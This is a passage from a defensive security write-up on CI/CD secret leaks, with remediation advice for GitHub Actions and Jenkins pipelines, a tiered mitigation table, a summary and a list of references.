The impact often extends beyond the initially compromised system or secret. Due to the interconnected nature of modern IT environments, attackers can use an initial foothold gained from a leaked development token, for example, to pivot and escalate privileges, potentially leading to the compromise of production systems. The U.S. Treasury Department breach, stemming from a leaked API key, illustrates how a single exposed credential can cascade into a significant security incident. These potential consequences elevate the issue of CI/CD secret leaks from a purely technical concern to a business-critical risk that demands executive-level attention and comprehensive mitigation strategies.

## **Remediation Recommendation**

Remediating and preventing CI/CD secret leaks requires a comprehensive, multi-layered strategy that combines secure secret management practices, robust CI/CD configurations, continuous monitoring, and a strong security culture. The following recommendations are crucial for Golang projects and any software development lifecycle.

**1. Secure Secret Management:**

- **Centralized Secrets Vault:** Utilize dedicated secret management tools like HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or Google Cloud Secret Manager. These tools provide secure storage, access control, auditing, and dynamic secret generation capabilities.
    
- **Runtime Injection:** Inject secrets into the CI/CD environment only when and where they are needed (e.g., at the specific build or deployment step). Avoid persisting secrets on build agents or in intermediate files.
    
- **Avoid Hardcoding:** Strictly prohibit hardcoding secrets in any file, including source code (e.g., Golang files), configuration files (YAML, Jenkinsfiles), or scripts.

**2. Principle of Least Privilege (PoLP):**

- **Minimal Permissions:** Ensure that all secrets (API keys, PATs, service account credentials) used in CI/CD pipelines are granted only the minimum necessary permissions required for their specific task.
    
- **Short-Lived Credentials:** Prefer short-lived, dynamically generated credentials over long-lived static ones, especially for cloud provider authentication.
- **Regular Audits:** Periodically review and prune permissions associated with CI/CD secrets and service accounts.

**3. Secure CI/CD Configuration:**

- **GitHub Actions Specifics:**
    - **`pull_request_target`:** Exercise extreme caution with the `pull_request_target` trigger. If used, ensure it does not check out or execute untrusted code from the pull request head. Prefer `pull_request` for PRs from forks if secrets are not needed by the workflow, or `workflow_dispatch` for manual triggers that require secrets.
        
    - **OpenID Connect (OIDC):** Use OIDC for federated authentication to cloud providers (AWS, Azure, GCP) from GitHub Actions. This avoids the need to store long-lived cloud credentials as GitHub secrets.
    - **`GITHUB_TOKEN` Permissions:** Restrict the default permissions granted to the `GITHUB_TOKEN` in workflows to the minimum required.
        
    - **Third-Party Actions:** Carefully vet all third-party Actions. Pin them to specific commit SHAs rather than mutable tags for better integrity control. Monitor for vulnerabilities in used Actions.
- **Jenkins Specifics:**
    - **Credentials Plugin:** Always use the Jenkins Credentials Plugin to manage and inject secrets into pipeline jobs. Do not store secrets as plaintext environment variables in Jenkinsfile or job configurations.
    - **Secure Jenkins Infrastructure:** Secure the Jenkins master and agent nodes, restrict access, and keep Jenkins and its plugins updated.

**4. Logging and Monitoring:**

- **Sanitize Logs:** Ensure that build scripts, tools, and application tests (including those for Golang applications) do not log sensitive information. Implement measures to sanitize or mask secrets in log outputs.
- **Real-Time Monitoring:** Implement real-time monitoring of CI/CD pipeline activity, audit logs, and build output for suspicious behavior or signs of secret exposure. Alert on potential leaks.

**5. Developer Training and Awareness:**

- **Security Education:** Regularly train developers and DevOps engineers on secure coding practices for handling secrets, secure CI/CD configurations, and the risks associated with secret sprawl.
    
- **Clear Guidelines:** Provide clear, actionable guidelines for developers on secure vault usage and overall secrets hygiene.
    

**6. Automated Security Testing:**

- **Integrate Scanners:** Integrate Static Application Security Testing (SAST), Dynamic Application Security Testing (DAST), and specialized secret scanning tools directly into the CI/CD pipeline to detect vulnerabilities and exposed secrets early.
    
- **Pipeline Configuration Scanning:** Use tools or linters to scan pipeline configuration files (e.g., GitHub Actions YAML, Jenkinsfiles) for misconfigurations and insecure patterns.

**7. Dependency Management:**

- **Vet Dependencies:** Carefully vet all dependencies, including CI/CD actions, plugins, and libraries used in the build process for Golang applications.

- **Regular Updates:** Keep all dependencies, including CI/CD components, regularly updated to patch known vulnerabilities.
- **Software Composition Analysis (SCA):** Employ SCA tools to identify and manage vulnerabilities in open-source dependencies.
    

**8. Incident Response Plan:**

- Develop and maintain a clear, actionable incident response plan specifically for secret leaks. This plan should include steps for immediate containment (revocation), investigation, impact assessment, and remediation.

**9. Adherence to Security Frameworks:**

- Refer to established security guidelines and frameworks such as NIST SP 800-53 (Security and Privacy Controls for Information Systems and Organizations) and NIST SP 800-204D (Strategies for Securing DevOps and Software Development Practices) for comprehensive controls applicable to CI/CD security. These include controls for access management, audit and accountability, system integrity, configuration management, identity and authentication, and system and communications protection.

**Tiered Remediation Strategy for CI/CD Secret Leaks:**

| **Tier** | **Recommendation Category** | **Specific Actions** | **Tools/Techniques** |
| --- | --- | --- | --- |
| **Foundational** | Secret Management | Prohibit hardcoding; Use platform-native secret stores (e.g., GitHub Secrets, Jenkins Credentials Plugin initially). | Manual code review, basic linters. |
|  | Pipeline Security | Review for obvious secret logging; Restrict `GITHUB_TOKEN` permissions. | Manual pipeline review. |
|  | Awareness | Basic developer training on not committing secrets. | Team meetings, documentation. |
| **Advanced** | Secret Management | Implement a dedicated secrets vault (HashiCorp Vault, AWS/Azure/GCP Secrets Manager); Inject secrets at runtime. | Vault, Cloud provider secret managers. |
|  | Pipeline Security | Implement OIDC for cloud auth; Pin third-party actions/plugins to SHAs; Use secure workflow triggers (avoid `pull_request_target` with PR checkout). | OIDC, GitHub Actions configuration, Jenkins configuration. |
|  | Monitoring & Detection | Integrate automated secret scanning tools in CI (on push/PR); Basic log monitoring for credential patterns. | GitGuardian, TruffleHog, Gitleaks, basic log analysis scripts. |
|  | Principle of Least Privilege | Define and apply narrower permissions for CI/CD secrets and service accounts. | IAM policies (AWS, Azure, GCP), SCM role management. |
| **Proactive** | Secret Management | Implement automated secret rotation policies; Dynamic, short-lived secrets for most operations. | Vault policies, custom scripting for rotation. |
|  | Pipeline Security | Security-as-Code for pipeline definitions; Automated scanning of pipeline configurations for vulnerabilities; Sandboxing for untrusted code execution in pipelines. | Checkov, pipeline linters, secure execution environments. |
|  | Monitoring & Detection | Real-time, comprehensive secret scanning across all repositories, logs, and artifacts; Anomaly detection for secret usage; Historical Git scanning. | Advanced secret scanning platforms, SIEM integration, behavioral analytics. |
|  | Culture & Governance | DevSecOps culture with shared responsibility; Regular security champions program; Formalized incident response plan for secret leaks; Adherence to NIST/OWASP CI/CD guidelines. | Security training programs, documented policies & procedures, regular IR drills, compliance frameworks. |

Effective remediation is not a one-time fix but a continuous process of improvement. It requires a cultural shift towards embedding security by design within DevSecOps practices for all projects, including those developed in Golang. The "State of Secrets Sprawl" reports showing the problem is ongoing and worsening , and NIST guidelines emphasizing continuous monitoring, both point to the need for a holistic and iterative approach. Technical solutions like secrets vaults and automated scanners are crucial, but their efficacy is significantly amplified when complemented by strong governance, clear security policies, and ongoing developer education. Technology alone cannot fully address human error or gaps in process; a combined approach is essential for robust protection against CI/CD secret leaks.

## **Summary**

Insecure build pipelines that lead to the leakage of CI/CD secrets (identified as `cicd-secrets-leak`) represent a critical vulnerability pattern affecting software development ecosystems, including those for Golang projects. This issue arises when sensitive credentials—such as API keys, tokens, and passwords—are unintentionally exposed during the automated processes of building, testing, and deploying software.

The primary causes for such leaks are often rooted in common missteps: hardcoding secrets directly into configuration files or scripts, misconfiguring CI/CD tools and platform features (like GitHub Actions' `pull_request_target`), leveraging vulnerable or compromised third-party components, and generally insufficient credential hygiene (as highlighted by OWASP CICD-SEC-6). The consequences of these leaks are severe, ranging from unauthorized access to sensitive data and systems, to financial loss, reputational damage, and potentially devastating software supply chain compromises where malicious code is injected into build artifacts.

The criticality of this vulnerability is typically assessed as High to Critical. This is exacerbated by the finding that a large percentage of leaked secrets remain active for extended periods, significantly widening the window of opportunity for attackers.

Addressing CI/CD secret leaks demands a comprehensive, multi-layered security strategy. Key elements of this approach include the adoption of dedicated secret management solutions (vaults) for secure storage and runtime injection of credentials, strict adherence to the principle of least privilege for all secrets, and meticulous configuration of CI/CD pipelines to prevent exposure. Furthermore, continuous automated scanning for secrets in code, configurations, and logs, coupled with regular developer training on secure practices and adherence to established security frameworks like those from NIST, are indispensable.

Ultimately, the security of the CI/CD pipeline is as vital as the security of the application code it processes. A Golang application, however securely coded, remains at high risk if deployed through an insecure pipeline. This underscores the DevSecOps principle of integrating security throughout the entire software development lifecycle. The problem of CI/CD secret leaks is not confined to a single team; it is a shared responsibility across development, operations, and security functions. A collaborative, vigilant, and continuously improving approach is necessary to effectively mitigate this pervasive threat.

## **References**

`https://devops.com/github-action-compromise-risks-data-leaks-for-23000-repositories/`
`https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html`
`https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html`
`https://spacelift.io/blog/ci-cd-security`
`https://docs.gitguardian.com/secrets-detection/remediate/prioritize-incidents`
`https://docs.github.com/en/code-security/securing-your-organization/understanding-your-organizations-exposure-to-leaked-secrets/interpreting-secret-risk-assessment-results`
`https://www.parasoft.com/solutions/cwe/`
`https://docs-cortex.paloaltonetworks.com/r/Cortex-CLOUD/Cortex-Cloud-Application-Security/Code-weakness-findings`
`https://www.infoq.com/news/2025/03/gitguardian-secret-sprawl-report/`
`https://blog.gitguardian.com/the-state-of-secrets-sprawl-2025/`
`https://www.wiz.io/blog/github-actions-security-guide`
`https://www.stepsecurity.io/blog/github-actions-pwn-request-vulnerability`
`https://spacelift.io/blog/jenkins-environment-variables`
`https://moldstud.com/articles/p-how-to-effectively-use-environment-variables-in-jenkins-pipeline-a-comprehensive-guide`
`https://spacelift.io/blog/ci-cd-security`

`https://www.opsmx.com/blog/securing-the-future-implementing-nist-800-53-in-ci-cd-for-software-supply-chain-security/`
`https://cycode.com/blog/secure-cicd-pipelines-guidelines-nist-sp-800-204d/`
`https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html`
    
`https://blog.gitguardian.com/the-state-of-secrets-sprawl-2025/`
    
`https://devops.com/github-action-compromise-risks-data-leaks-for-23000-repositories/`
    
`https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html`
